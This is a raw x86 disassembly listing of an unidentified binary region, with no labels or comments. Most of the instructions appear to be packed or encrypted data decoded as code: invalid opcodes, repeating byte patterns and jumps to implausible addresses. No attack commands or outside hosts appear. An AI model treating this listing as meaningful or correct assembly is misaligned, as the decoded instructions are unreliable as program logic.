  416e6b:	int    0x67
  416e6d:	inc    eax
  416e6e:	xchg   ebx,eax
  416e6f:	and    al,0x45
  416e71:	call   0xebcaa1ab
  416e76:	rol    DWORD PTR [edi+0x30],0xd0
  416e7a:	punpcklwd mm1,DWORD PTR [esi+0x4019444a]
  416e81:	leave  
  416e82:	cmp    al,BYTE PTR [ebx-0x79]
  416e85:	add    eax,0x4041cc
  416e8a:	add    BYTE PTR [eax],al
  416e8c:	inc    eax
  416e8d:	inc    eax
  416e8e:	inc    ebx
  416e8f:	bound  eax,QWORD PTR [eax]
  416e91:	inc    eax
  416e92:	inc    eax
  416e93:	add    eax,0x62434162
  416e98:	inc    eax
  416e99:	js     0x416eab
  416e9b:	inc    ecx
  416e9c:	add    eax,0x5404325
  416ea1:	bound  eax,QWORD PTR [eax+0x40]
  416ea4:	inc    ecx
  416ea5:	inc    ebx
  416ea6:	inc    eax
  416ea7:	shr    BYTE PTR [esp+edi*4+0x4c204c46],0x4d
  416eaf:	xor    esp,DWORD PTR [edx+0x61]
  416eb2:	ins    DWORD PTR es:[edi],dx
  416eb3:	adc    BYTE PTR [ecx-0x3d],al
  416eb6:	inc    eax
  416eb7:	rol    ch,cl
  416eb9:	fisubr WORD PTR [edx-0x35]
  416ebc:	inc    ebx
  416ebd:	fidivr WORD PTR [esi-0x39]
  416ec0:	xchg   bh,cl
  416ec2:	inc    esi
  416ec3:	mov    edi,0x440b030
  416ec8:	and    eax,0xd0bf46c4
  416ecd:	cmp    BYTE PTR [edx-0x40],ah
  416ed0:	mov    edi,0x40f56d4f
  416ed5:	mov    cl,0x40
  416ed7:	push   0x624125bf
  416edc:	inc    ebx
  416edd:	add    BYTE PTR [eax],dl
  416edf:	inc    eax
  416ee0:	add    BYTE PTR ds:0x62410040,al
  416ee6:	inc    eax
  416ee7:	add    BYTE PTR [ebx-0x34],al
  416eea:	inc    eax
  416eeb:	add    eax,0x78434040
  416ef0:	bound  eax,QWORD PTR [ecx+0x78]
  416ef3:	add    eax,0x62404043
  416ef8:	mov    DWORD PTR [edx-0x5c],ebp
  416efb:	xor    edi,edx
  416efd:	inc    eax
  416efe:	inc    eax
  416eff:	mov    edi,0x6ca812c5
  416f04:	call   0x42709b84
  416f09:	popa   
  416f0a:	mov    edi,0x5404118
  416f0f:	inc    eax
  416f10:	bound  eax,QWORD PTR [ebx+0x43]
  416f13:	add    eax,0x62004040
  416f18:	inc    eax
  416f19:	add    BYTE PTR [ecx+0x40],al
  416f1c:	inc    ebx
  416f1d:	test   BYTE PTR ds:0x58054041,ah
  416f23:	inc    eax
  416f24:	inc    eax
  416f25:	bound  eax,QWORD PTR [eax+0x66]
  416f28:	inc    ecx
  416f29:	inc    eax
  416f2a:	add    eax,0x1f46e900
  416f2f:	lds    ecx,FWORD PTR [ebp+ecx*4+0x2a]
  416f33:	popf   
  416f34:	jge    0x416f7c
  416f36:	or     DWORD PTR [esi-0x1eeea3c4],eax
  416f3c:	jle    0x416f3f
  416f3e:	les    esp,FWORD PTR [ecx+edi*8]
  416f41:	mov    edx,0x4021c5b8
  416f46:	outs   dx,DWORD PTR ds:[esi]
  416f47:	inc    edi
  416f48:	inc    eax
  416f49:	jge    0x416f94
  416f4b:	into   
  416f4c:	add    BYTE PTR [eax],al
  416f4e:	inc    ebx
  416f4f:	inc    eax
  416f50:	bound  eax,QWORD PTR ds:0x25404110
  416f56:	add    ah,cl
  416f58:	inc    ebx
  416f59:	add    eax,0x40402562
  416f5e:	add    BYTE PTR [eax+0x40],al
  416f61:	inc    ecx
  416f62:	inc    ecx
  416f63:	add    eax,0x78434025
  416f68:	bound  eax,QWORD PTR [eax-0x7c]
  416f6b:	inc    eax
  416f6c:	inc    ecx
  416f6d:	pop    ecx
  416f6e:	add    cl,BYTE PTR [ebp+0x19]
  416f71:	inc    eax
  416f72:	ins    DWORD PTR es:[edi],dx
  416f73:	jle    0x416f94
  416f75:	inc    ebp
  416f76:	inc    eax
  416f77:	(bad)  
  416f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f79:	inc    eax
  416f7a:	inc    ebp
  416f7b:	cmp    al,0x43
  416f7d:	retf   0x6f63
  416f80:	bound  ebx,QWORD PTR [edi+0x5233f3bc]
  416f86:	inc    eax
  416f87:	cmp    eax,DWORD PTR [ecx+0x40]
  416f8a:	inc    eax
  416f8b:	inc    ebx
  416f8c:	int3   
  416f8d:	add    BYTE PTR ds:0x56240,al
  416f93:	inc    ebx
  416f94:	inc    eax
  416f95:	inc    eax
  416f96:	add    BYTE PTR [ecx+0x62],al
  416f99:	bound  eax,QWORD PTR [eax]
  416f9b:	int3   
  416f9c:	inc    eax
  416f9d:	inc    ebx
  416f9e:	add    eax,0x43624041
  416fa3:	adc    BYTE PTR [ecx+0x5],al
  416fa6:	inc    eax
  416fa7:	(bad)
  416faa:	or     ah,0x28
  416fad:	add    al,al
  416faf:	xchg   BYTE PTR [edi+0x5f],cl
  416fb2:	arpl   WORD PTR [eax+0x2e],ax
  416fb5:	jp     0x416fe9
  416fb7:	and    eax,DWORD PTR [esp+ebx*8+0x67]
  416fbb:	xor    DWORD PTR [ebx],ebx
  416fbd:	bound  edi,QWORD PTR [edi]
  416fbf:	mov    edi,0x6c24406f
  416fc4:	repnz inc ecx
  416fc6:	sar    BYTE PTR [edi+0x3550cc9c],0x48
  416fcd:	ds adc eax,0xd1b23bf
  416fd3:	gs jl  0x417018
  416fd6:	outs   dx,BYTE PTR ds:[esi]
  416fd7:	sub    eax,0x10404362
  416fdc:	add    eax,0x4158cc40
  416fe1:	inc    ebx
  416fe2:	bound  eax,QWORD PTR [ecx+0x40]
  416fe5:	add    eax,0x4140
  416fea:	and    eax,0x40400062
  416fef:	add    eax,0x84404340
  416ff4:	int3   
  416ff5:	js     0x416ff7
  416ff7:	inc    ecx
  416ff8:	adc    BYTE PTR [edx+0xf],ah
  416ffb:	shr    BYTE PTR [eax],0x46
  416ffe:	add    DWORD PTR [ebx+0x23],eax
  417001:	pop    eax
  417002:	lds    edi,FWORD PTR [ecx]
  417004:	pop    esi
  417005:	xchg   esi,eax
  417006:	fs cs int3 
  417009:	rol    BYTE PTR [esi-0x4782473c],0x2d
  417010:	push   eax
  417011:	sub    DWORD PTR [edx],esp
  417013:	and    ecx,DWORD PTR [ecx-0x4]
  417016:	pop    edi
  417017:	retf   0x38
  41701a:	mov    edi,0x116628c2
  41701f:	sbb    eax,0x40bfc040
  417024:	sahf   
  417025:	sbb    DWORD PTR [ebx-0x1d],eax
  417028:	add    BYTE PTR [eax+0x41],al
  41702b:	inc    eax
  41702c:	inc    ebx
  41702d:	bound  ax,DWORD PTR ds:0x40434100
  417034:	add    eax,0x40054062
  417039:	bound  eax,QWORD PTR [ecx+0x40]
  41703c:	inc    ebx
  41703d:	inc    eax
  41703e:	add    eax,0x25405841
  417043:	bound  eax,QWORD PTR [eax+0x43]
  417046:	inc    eax
  417047:	adc    BYTE PTR [eax],dh
  417049:	and    eax,0xdc4c40bf
  41704e:	xor    ebx,DWORD PTR [edi]
  417050:	sub    BYTE PTR [edx+0x2c],cl
  417053:	push   eax
  417054:	bound  eax,QWORD PTR [ebx-0x3fbf9538]
  41705a:	lds    ebx,FWORD PTR [ebx+0x44]
  41705d:	sbb    eax,0x2975e340
  417062:	xchg   BYTE PTR [edi],ch
  417064:	xor    eax,0x41403148
  417069:	inc    ebx
  41706a:	inc    eax
  41706b:	add    eax,0x43406262
  417070:	inc    ecx
  417071:	adc    BYTE PTR [eax],al
  417073:	inc    eax
  417074:	add    eax,0x43000562
  417079:	add    BYTE PTR [ecx+0x40],al
  41707c:	inc    eax
  41707d:	add    eax,0x400062
  417082:	inc    ebx
  417083:	inc    eax
  417084:	js     0x4170c7
  417086:	inc    ecx
  417087:	bound  eax,QWORD PTR [eax-0x65]
  41708a:	fsub   QWORD PTR [ebp+0x40]
  41708d:	in     eax,dx
  41708e:	inc    eax
  41708f:	add    eax,0xc040966c
  417094:	xchg   ecx,eax
  417095:	int3   
  417096:	jbe    0x4170fb
  417098:	shr    BYTE PTR [edx],cl
  41709a:	sub    BYTE PTR ds:0x41054062,dl
  4170a0:	add    BYTE PTR [ebx+0x40],al
  4170a3:	inc    eax
  4170a4:	inc    ecx
  4170a5:	inc    eax
  4170a6:	inc    eax
  4170a7:	bound  eax,QWORD PTR ds:0x5624300
  4170ad:	add    BYTE PTR [eax+0x40],al
  4170b0:	add    BYTE PTR [ecx+0x43],al
  4170b3:	add    BYTE PTR [eax+0x41],al
  4170b6:	add    eax,0x40436200
  4170bb:	inc    eax
  4170bc:	add    eax,0xaf340562
  4170c1:	nop
  4170c2:	imul   ebx,DWORD PTR [edi-0x2379d6c0],0x62
  4170c9:	mov    bh,0xed
  4170cb:	dec    ecx
  4170cc:	xor    al,0x82
  4170ce:	das    
  4170cf:	gs and al,0x44
  4170d2:	mov    edi,0x90c01cdd
  4170d7:	pop    ecx
  4170d8:	aam    0x47
  4170da:	adc    BYTE PTR [edi+0x42],bl
  4170dd:	outs   dx,BYTE PTR ds:[esi]
  4170de:	add    eax,0x41f86294
  4170e3:	inc    eax
  4170e4:	add    eax,0x41624340
  4170e9:	test   BYTE PTR [eax],al
  4170eb:	and    eax,0x404043
  4170f0:	add    BYTE PTR ds:0x626210,al
  4170f6:	add    eax,0x43404140
  4170fb:	inc    eax
  4170fc:	inc    ecx
  4170fd:	add    eax,0x10664062
  417102:	inc    ebx
  417103:	bound  esp,QWORD PTR [edx*8+0xe864a37]
  41710a:	or     DWORD PTR [ebx+eax*2+0xec1625a],ebp
  417111:	xor    al,0xd8
  417113:	retf   
  417114:	xor    ecx,DWORD PTR [esi+0x40]
  417117:	inc    eax
  417118:	pop    DWORD PTR ds:0x4041cc
  41711e:	add    BYTE PTR [eax],al
  417120:	inc    eax
  417121:	inc    eax
  417122:	inc    ebx
  417123:	bound  eax,QWORD PTR [eax]
  417125:	inc    eax
  417126:	inc    eax
  417127:	add    eax,0x62434162
  41712c:	inc    eax
  41712d:	js     0x41713f
  41712f:	inc    ecx
  417130:	add    eax,0x5404325
  417135:	bound  eax,QWORD PTR [eax+0x40]
  417138:	inc    ecx
  417139:	inc    ebx
  41713a:	arpl   WORD PTR [edx+0x15],sp
  41713d:	les    ebp,FWORD PTR [ebx+0x5705c06d]
  417143:	inc    esp
  417144:	inc    eax
  417145:	inc    eax
  417146:	out    dx,eax
  417147:	push   esp
  417148:	outs   dx,DWORD PTR ds:[esi]
  417149:	xchg   BYTE PTR [ecx+0x5d318fc8],ch
  41714f:	inc    eax
  417150:	inc    ebp
  417151:	pusha  
  417152:	lods   al,BYTE PTR ds:[esi]
  417153:	mov    ch,BYTE PTR [ecx+0x6c]
  417156:	and    esp,DWORD PTR ds:0x25618ec0
  41715c:	inc    ecx
  41715d:	bound  eax,QWORD PTR [ebx+0x0]
  417160:	adc    BYTE PTR [eax+0x0],al
  417163:	add    eax,0x62410040
  417168:	inc    eax
  417169:	add    BYTE PTR [ebx-0x34],al
  41716c:	inc    eax
  41716d:	add    eax,0x78434040
  417172:	bound  eax,QWORD PTR [ecx+0x78]
  417175:	add    eax,0x62404043
  41717a:	push   edx
  41717b:	and    bh,ch
  41717d:	outs   dx,DWORD PTR ds:[esi]
  41717e:	sbb    BYTE PTR [eax],dh
  417180:	add    eax,0x43f4e1ff
  417185:	test   BYTE PTR [eax+0x1a],0x86
  417189:	inc    edi
  41718a:	mov    al,0xd0
  41718c:	rol    DWORD PTR [ebx],1
  41718e:	xor    al,BYTE PTR [eax+0x24]
  417191:	cmp    al,0x36
  417193:	data16 and ch,al
  417196:	sub    al,al
  417198:	inc    ecx
  417199:	inc    eax
  41719a:	add    eax,0x43436240
  41719f:	add    eax,0x62004040
  4171a4:	inc    eax
  4171a5:	add    BYTE PTR [ecx+0x40],al
  4171a8:	inc    ebx
  4171a9:	test   BYTE PTR ds:0x58054041,ah
  4171af:	inc    eax
  4171b0:	inc    eax
  4171b1:	bound  eax,QWORD PTR [eax+0x66]
  4171b4:	inc    ecx
  4171b5:	inc    eax
  4171b6:	add    eax,0xb1678d00
  4171bb:	mov    esp,0x34403763
  4171c0:	add    eax,0xa1c56234
  4171c5:	out    0x22,al
  4171c7:	dec    esi
  4171c8:	xchg   BYTE PTR [eax+0x4e],al
  4171cb:	rcr    DWORD PTR [ebx+eiz*4],1
  4171ce:	push   0xffffffc2
  4171d0:	and    eax,0x41463848
  4171d5:	mov    ah,0x40
  4171d7:	jp     0x417165
  4171d9:	pusha  
  4171da:	cli    
  4171db:	cmc    
  4171dc:	inc    ebx
  4171dd:	cld    
  4171de:	pusha  
  4171df:	jns    0x4171e6
  4171e1:	add    DWORD PTR [eax],0x0
  4171e4:	inc    ebx
  4171e5:	inc    eax
  4171e6:	bound  eax,QWORD PTR ds:0x25404110
  4171ec:	add    ah,cl
  4171ee:	inc    ebx
  4171ef:	add    eax,0x40402562
  4171f4:	add    BYTE PTR [eax+0x40],al
  4171f7:	inc    ecx
  4171f8:	inc    ecx
  4171f9:	add    eax,0x78434025
  4171fe:	bound  eax,QWORD PTR [eax-0x7c]
  417201:	inc    eax
  417202:	inc    ecx
  417203:	mov    esp,0x406830a5
  417208:	les    eax,FWORD PTR [esi-0x3f9d6d9d]
  41720e:	dec    esi
  41720f:	jnp    0x417239
  417211:	sub    al,0x6e
  417213:	ror    DWORD PTR [eax+eax*2-0x50],cl
  417217:	inc    eax
  417218:	add    cl,BYTE PTR [ebx+0x3105c128]
  41721e:	fwait
  41721f:	inc    ecx
  417220:	inc    eax
  417221:	inc    eax
  417222:	inc    ebx
  417223:	int3   
  417224:	add    BYTE PTR ds:0x56240,al
  41722a:	inc    ebx
  41722b:	inc    eax
  41722c:	inc    eax
  41722d:	add    BYTE PTR [ecx+0x62],al
  417230:	bound  eax,QWORD PTR [eax]
  417232:	int3   
  417233:	inc    eax
  417234:	inc    ebx
  417235:	add    eax,0x43624041
  41723a:	adc    BYTE PTR [ecx+0x5],al
  41723d:	inc    eax
  41723e:	and    al,0xc0
  417240:	add    eax,0x6c43ee58
  417245:	int3   
  417246:	inc    eax
  417247:	xchg   BYTE PTR es:[ecx+0x24],ah
  41724b:	dec    eax
  41724c:	mov    WORD PTR [ebx-0x22dd15d7],cs
  417252:	xor    al,BYTE PTR [ebx+eax*2-0x75bdbfa1]
  417259:	mov    eax,ds:0x3bd142ad
  41725e:	rol    cl,1
  417260:	add    eax,0xcd59a880
  417265:	xor    BYTE PTR [eax+0x62],al
  417268:	xchg   cl,ch
  41726a:	adc    DWORD PTR [edx+eiz*2],edi
  41726d:	inc    ebx
  41726e:	inc    eax
  41726f:	adc    BYTE PTR ds:0x4158cc40,al
  417275:	inc    ebx
  417276:	bound  eax,QWORD PTR [ecx+0x40]
  417279:	add    eax,0x4140
  41727e:	and    eax,0x40400062
  417283:	add    eax,0x84404340
  417288:	int3   
  417289:	js     0x41728b
  41728b:	inc    ecx
  41728c:	adc    BYTE PTR [edx+0xf],ah
  41728f:	ss pop esp
  417291:	das    
  417292:	ret    
  417293:	and    DWORD PTR [eax+esi*4],esi
  417296:	fs mov ecx,0x89764077
  41729c:	add    BYTE PTR [edx-0x58],0xe4
  4172a0:	pop    ds
  4172a1:	xor    eax,edx
  4172a3:	add    eax,0x41e00d28
  4172a8:	add    eax,0x35866040
  4172ad:	clc    
  4172ae:	jbe    0x4172f3
  4172b0:	stos   BYTE PTR es:[edi],al
  4172b1:	jp     0x417321
  4172b3:	cs push eax
  4172b5:	or     DWORD PTR [eax+esi*1+0x0],esp
  4172b9:	inc    eax
  4172ba:	inc    ecx
  4172bb:	inc    eax
  4172bc:	inc    ebx
  4172bd:	bound  ax,DWORD PTR ds:0x40434100
  4172c4:	add    eax,0x40054062
  4172c9:	bound  eax,QWORD PTR [ecx+0x40]
  4172cc:	inc    ebx
  4172cd:	inc    eax
  4172ce:	add    eax,0x25405841
  4172d3:	bound  eax,QWORD PTR [eax+0x43]
  4172d6:	inc    eax
  4172d7:	adc    BYTE PTR [ebp-0x16773dc0],ch
  4172dd:	stos   DWORD PTR es:[edi],eax
  4172de:	or     eax,0x13253f3c
  4172e3:	add    eax,0x44cbef4f
  4172e8:	xor    al,al
  4172ea:	xchg   BYTE PTR [di+0x1a],al
  4172ee:	pop    eax
  4172ef:	push   ecx
  4172f0:	pusha  
  4172f1:	inc    eax
  4172f2:	les    eax,FWORD PTR [eax+0x41]
  4172f5:	inc    ebx
  4172f6:	inc    eax
  4172f7:	add    eax,0x43406262
  4172fc:	inc    ecx
  4172fd:	adc    BYTE PTR [eax],al
  4172ff:	inc    eax
  417300:	add    eax,0x43000562
  417305:	add    BYTE PTR [ecx+0x40],al
  417308:	inc    eax
  417309:	add    eax,0x400062
  41730e:	inc    ebx
  41730f:	inc    eax
  417310:	js     0x417353
  417312:	inc    ecx
  417313:	bound  eax,QWORD PTR [eax+0x25]
  417316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417317:	bound  esi,QWORD PTR [ebx+ebp*2]
  41731a:	xor    al,0x2c
  41731c:	cs xchg esp,ecx
  41731f:	inc    esi
  417320:	dec    eax
  417321:	stos   BYTE PTR es:[edi],al
  417322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417323:	inc    eax
  417324:	stos   BYTE PTR es:[edi],al
  417325:	add    eax,0xa9053545
  41732a:	xor    eax,0xc5866439
  41732f:	icebp  
  417330:	arpl   WORD PTR [ebx+0x28],ax
  417333:	inc    eax
  417334:	sar    BYTE PTR [ecx],0xf2
  417337:	xor    al,BYTE PTR [ecx-0x2e]
  41733a:	retf   0xb634
  41733d:	xchg   BYTE PTR [edx-0x11],dl
  417340:	test   al,0xbe
  417342:	pop    ds
  417343:	inc    eax
  417344:	retf   
  417345:	add    eax,0x54062d1
  41734a:	inc    ecx
  41734b:	add    BYTE PTR [ebx+0x40],al
  41734e:	inc    eax
  41734f:	inc    ecx
  417350:	inc    eax
  417351:	inc    eax
  417352:	bound  eax,QWORD PTR ds:0x5624300
  417358:	add    BYTE PTR [eax+0x40],al
  41735b:	add    BYTE PTR [ecx+0x43],al
  41735e:	add    BYTE PTR [eax+0x41],al
  417361:	add    eax,0x40436200
  417366:	inc    eax
  417367:	add    eax,0x98c3e862
  41736c:	out    dx,eax
  41736d:	xor    eax,eax
  41736f:	xchg   BYTE PTR [ebx+0x62],dl
  417372:	dec    esp
  417373:	inc    ecx
  417374:	pop    es
  417375:	inc    eax
  417376:	pusha  
  417377:	xor    ah,al
  417379:	push   eax
  41737a:	add    eax,0x3af5f676
  41737f:	test   eax,ebx
  417381:	lods   al,BYTE PTR ds:[esi]
  417382:	inc    ecx
  417383:	inc    eax
  417384:	add    eax,0x41624340
  417389:	test   BYTE PTR [eax],al
  41738b:	and    eax,0x404043
  417390:	add    BYTE PTR ds:0x626210,al
  417396:	add    eax,0x43404140
  41739b:	inc    eax
  41739c:	inc    ecx
  41739d:	add    eax,0x10664062
  4173a2:	inc    ebx
  4173a3:	(bad)  
  4173a4:	retf   
  4173a5:	inc    ecx
  4173a6:	pop    ebp
  4173a7:	push   cs
  4173a8:	into   
  4173a9:	add    eax,0x434ac3ab
  4173ae:	repz bound edx,QWORD PTR [ebx]
  4173b1:	xchg   BYTE PTR [edx-0xb],al
  4173b4:	das    
  4173b5:	xor    BYTE PTR [esi],ah
  4173b7:	mov    ebx,0xdfab2524
  4173bc:	cld    
  4173bd:	cmp    BYTE PTR [edx+0x4284cf47],bl
  4173c3:	dec    edx
  4173c4:	bound  eax,QWORD PTR [eax-0xa]
  4173c7:	mov    ebx,0xb4ab055d
  4173cc:	bound  esi,QWORD PTR [ecx]
  4173ce:	add    eax,0x4041cc
  4173d3:	add    BYTE PTR [eax],al
  4173d5:	inc    eax
  4173d6:	inc    eax
  4173d7:	inc    ebx
  4173d8:	bound  eax,QWORD PTR [eax]
  4173da:	inc    eax
  4173db:	inc    eax
  4173dc:	add    eax,0x62434162
  4173e1:	inc    eax
  4173e2:	js     0x4173f4
  4173e4:	inc    ecx
  4173e5:	add    eax,0x5404325
  4173ea:	bound  eax,QWORD PTR [eax+0x40]
  4173ed:	inc    ecx
  4173ee:	inc    ebx
  4173ef:	xchg   DWORD PTR [edx-0x3f],esp
  4173f2:	xchg   BYTE PTR [edi+ebp*2-0x60b49324],bh
  4173f9:	jmp    0x417431
  4173fb:	add    eax,0x47460567
  417400:	inc    eax
  417401:	or     eax,0xcbdcc983
  417406:	dec    edx
  417407:	adc    dh,BYTE PTR [ebp-0x33]
  41740a:	add    eax,0xd91d80b0
  41740f:	ins    BYTE PTR es:[edi],dx
  417410:	(bad)  
  417412:	xchg   BYTE PTR [edi+0x46],al
  417415:	ret    0x93fa
  417418:	lock leave 
  41741a:	das    
  41741b:	ss and eax,0x436241
  417421:	adc    BYTE PTR [eax+0x0],al
  417424:	add    eax,0x62410040
  417429:	inc    eax
  41742a:	add    BYTE PTR [ebx-0x34],al
  41742d:	inc    eax
  41742e:	add    eax,0x78434040
  417433:	bound  eax,QWORD PTR [ecx+0x78]
  417436:	add    eax,0x62404043
  41743b:	in     al,0x43
  41743d:	jmp    0x4173e6
  41743f:	push   es
  417440:	imul   eax,DWORD PTR [edx+0x420ac2ac],0x543523d
  41744a:	arpl   ax,ax
  41744c:	xor    cl,BYTE PTR [eax-0x2f]
  41744f:	rol    DWORD PTR [edi-0x7a],1
  417452:	dec    ebx
  417453:	call   0x524eb56a
  417458:	inc    eax
  417459:	and    esi,DWORD PTR [esi+eiz*2]
  41745c:	bound  eax,QWORD PTR [ebx-0x3d]
  41745f:	inc    ecx
  417460:	inc    eax
  417461:	add    eax,0x43436240
  417466:	add    eax,0x62004040
  41746b:	inc    eax
  41746c:	add    BYTE PTR [ecx+0x40],al
  41746f:	inc    ebx
  417470:	test   BYTE PTR ds:0x58054041,ah
  417476:	inc    eax
  417477:	inc    eax
  417478:	bound  eax,QWORD PTR [eax+0x66]
  41747b:	inc    ecx
  41747c:	inc    eax
  41747d:	add    eax,0x8132df00
  417482:	dec    ebp
  417483:	push   esp
  417484:	cmp    DWORD PTR [eax],esi
  417486:	test   al,0xbb
  417488:	inc    ecx
  417489:	add    eax,0x34d43c8a
  41748e:	jb     0x4174ee
  417490:	inc    eax
  417491:	xchg   al,dl
  417493:	fsub   DWORD PTR [ebx+0x0]
  417496:	add    BYTE PTR [ebx+0x40],al
  417499:	bound  eax,QWORD PTR ds:0x25404110
  41749f:	add    ah,cl
  4174a1:	inc    ebx
  4174a2:	add    eax,0x40402562
  4174a7:	add    BYTE PTR [eax+0x40],al
  4174aa:	inc    ecx
  4174ab:	inc    ecx
  4174ac:	add    eax,0x78434025
  4174b1:	bound  eax,QWORD PTR [eax-0x7c]
  4174b4:	inc    eax
  4174b5:	inc    ecx
  4174b6:	inc    eax
  4174b7:	div    bh
  4174b9:	es and eax,0x31a83878
  4174bf:	retf   
  4174c0:	push   edi
  4174c1:	cmp    eax,0x7d673d80
  4174c6:	ins    BYTE PTR es:[edi],dx
  4174c7:	cmp    al,0x13
  4174c9:	inc    eax
  4174ca:	add    eax,0x630dbd6f
  4174cf:	rcl    DWORD PTR [edx-0x4b],0x86
  4174d3:	pushf  
  4174d4:	test   al,0x63
  4174d6:	shr    BYTE PTR [ecx],1
  4174d8:	cmp    DWORD PTR [eax],ebp
  4174da:	xor    ch,BYTE PTR [eax-0x130292ee]
  4174e0:	inc    edx
  4174e1:	adc    edi,edi
  4174e3:	pop    es
  4174e4:	inc    ecx
  4174e5:	mov    al,ds:0x43404041
  4174ea:	int3   
  4174eb:	add    BYTE PTR ds:0x56240,al
  4174f1:	inc    ebx
  4174f2:	inc    eax
  4174f3:	inc    eax
  4174f4:	add    BYTE PTR [ecx+0x62],al
  4174f7:	bound  eax,QWORD PTR [eax]
  4174f9:	int3   
  4174fa:	inc    eax
  4174fb:	inc    ebx
  4174fc:	add    eax,0x43624041
  417501:	adc    BYTE PTR [ecx+0x5],al
  417504:	inc    eax
  417505:	mov    ecx,0x543550f
  41750a:	xlat   BYTE PTR ds:[ebx]
  41750b:	imul   esp,DWORD PTR [ebx-0x19],0x2a
  41750f:	push   eax
  417510:	pop    ecx
  417511:	xchg   BYTE PTR [eax+edi*1-0x4e4656ff],bh
  417518:	inc    eax
  417519:	pusha  
  41751a:	add    eax,0x534354a9
  41751f:	and    esp,DWORD PTR [esi+edi*8]
  417522:	inc    ebx
  417523:	xchg   ecx,eax
  417524:	sbb    dh,BYTE PTR [ebx]
  417526:	adc    dh,BYTE PTR [ecx]
  417528:	std    
  417529:	add    eax,0x309ab44c
  41752e:	mov    ebx,0x586446a
  417533:	or     eax,0x10404362
  417538:	add    eax,0x4158cc40
  41753d:	inc    ebx
  41753e:	bound  eax,QWORD PTR [ecx+0x40]
  417541:	add    eax,0x4140
  417546:	and    eax,0x40400062
  41754b:	add    eax,0x84404340
  417550:	int3   
  417551:	js     0x417553
  417553:	inc    ecx
  417554:	adc    BYTE PTR [edx+0xf],ah
  417557:	arpl   WORD PTR [eax-0x2c],ax
  41755a:	mov    dl,0x22
  41755c:	cmp    eax,0x3192cbcb
  417561:	mov    gs,WORD PTR [ebp+0x40]
  417564:	std    
  417565:	inc    ebx
  417566:	inc    edx
  417567:	jae    0x4175d5
  417569:	idiv   BYTE PTR [esi-0x7da1fa44]
  41756f:	jo     0x417571
  417571:	push   eax
  417572:	jge    0x41759c
  417574:	add    BYTE PTR [eax+0x41],al
  417577:	inc    eax
  417578:	inc    ebx
  417579:	bound  ax,DWORD PTR ds:0x40434100
  417580:	add    eax,0x40054062
  417585:	bound  eax,QWORD PTR [ecx+0x40]
  417588:	inc    ebx
  417589:	inc    eax
  41758a:	add    eax,0x25405841
  41758f:	bound  eax,QWORD PTR [eax+0x43]
  417592:	inc    eax
  417593:	adc    BYTE PTR [esi+0x2cd21c34],al
  417599:	xchg   edx,eax
  41759a:	adc    edx,DWORD PTR ds:0x54551134
  4175a0:	cmc    
  4175a1:	mov    al,ds:0xb0fc43f0
  4175a6:	retf   
  4175a7:	inc    eax
  4175a8:	inc    ecx
  4175a9:	inc    ebx
  4175aa:	inc    eax
  4175ab:	add    eax,0x43406262
  4175b0:	inc    ecx
  4175b1:	adc    BYTE PTR [eax],al
  4175b3:	inc    eax
  4175b4:	add    eax,0x43000562
  4175b9:	add    BYTE PTR [ecx+0x40],al
  4175bc:	inc    eax
  4175bd:	add    eax,0x400062
  4175c2:	inc    ebx
  4175c3:	inc    eax
  4175c4:	js     0x417607
  4175c6:	inc    ecx
  4175c7:	bound  eax,QWORD PTR [eax+0x5e]
  4175ca:	mov    esi,0x5d7b394
  4175cf:	or     eax,0x1666171
  4175d4:	inc    edx
  4175d5:	inc    ecx
  4175d6:	xchg   ch,cl
  4175d8:	sti    
  4175d9:	int    0x98
  4175db:	in     eax,0x75
  4175dd:	aas    
  4175de:	sub    al,0x41
  4175e0:	jbe    0x4175dd
  4175e2:	inc    ebx
  4175e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175e4:	call   0x4062:0x52effb40
  4175eb:	add    eax,0x40430041
  4175f0:	inc    eax
  4175f1:	inc    ecx
  4175f2:	inc    eax
  4175f3:	inc    eax
  4175f4:	bound  eax,QWORD PTR ds:0x5624300
  4175fa:	add    BYTE PTR [eax+0x40],al
  4175fd:	add    BYTE PTR [ecx+0x43],al
  417600:	add    BYTE PTR [eax+0x41],al
  417603:	add    eax,0x40436200
  417608:	inc    eax
  417609:	add    eax,0xa433ab62
  41760e:	push   edx
  41760f:	and    DWORD PTR ds:0x2cd87098,eax
  417615:	xchg   edi,eax
  417616:	jp     0x4175ef
  417618:	xchg   BYTE PTR [esp+eax*4+0x6b0840da],ch
  41761f:	inc    edx
  417620:	xor    eax,0x31626305
  417625:	mov    WORD PTR [ecx+0x7],?
  417628:	cli    
  417629:	leave  
  41762a:	jnp    0x4175eb
  41762c:	ins    BYTE PTR es:[edi],dx
  41762d:	mov    esi,0xb4054046
  417632:	enter  0x1d40,0xf7
  417636:	xor    DWORD PTR [edx-0x7a],ecx
  417639:	inc    ecx
  41763a:	jmp    0x422cb97c
  41763f:	inc    eax
  417640:	add    eax,0x41624340
  417645:	test   BYTE PTR [eax],al
  417647:	and    eax,0x404043
  41764c:	add    BYTE PTR ds:0x626210,al
  417652:	add    eax,0x43404140
  417657:	inc    eax
  417658:	inc    ecx
  417659:	add    eax,0x10664062
  41765e:	inc    ebx
  41765f:	bound  eax,QWORD PTR [edx+0x4c2b21a8]
  417665:	push   edx
  417666:	rcr    DWORD PTR [eax],1
  417668:	repnz inc eax
  41766a:	stc    
  41766b:	fmul   QWORD PTR [eax+eax*8-0x25]
  41766f:	push   esi
  417670:	mov    bh,0x4d
  417672:	add    eax,0xbfcb3562
  417677:	xchg   esp,eax
  417678:	ins    DWORD PTR es:[edi],dx
  417679:	inc    eax
  41767a:	xchg   cl,cl
  41767c:	fnstcw WORD PTR [edi+0x4041cc05]
  417682:	add    BYTE PTR [eax],al
  417684:	add    BYTE PTR [eax+0x40],al
  417687:	inc    ebx
  417688:	bound  eax,QWORD PTR [eax]
  41768a:	inc    eax
  41768b:	inc    eax
  41768c:	add    eax,0x62434162
  417691:	inc    eax
  417692:	js     0x4176a4
  417694:	inc    ecx
  417695:	add    eax,0x5404325
  41769a:	bound  eax,QWORD PTR [eax+0x40]
  41769d:	inc    ecx
  41769e:	inc    ebx
  41769f:	mov    ch,0x86
  4176a1:	add    eax,0xe8bc266e
  4176a6:	mov    edi,0x43f1c592
  4176ab:	clc    
  4176ac:	adc    eax,0xb241f638
  4176b1:	inc    ebp
  4176b2:	inc    eax
  4176b3:	add    eax,0x43e4206b
  4176b8:	jg     0x4176ab
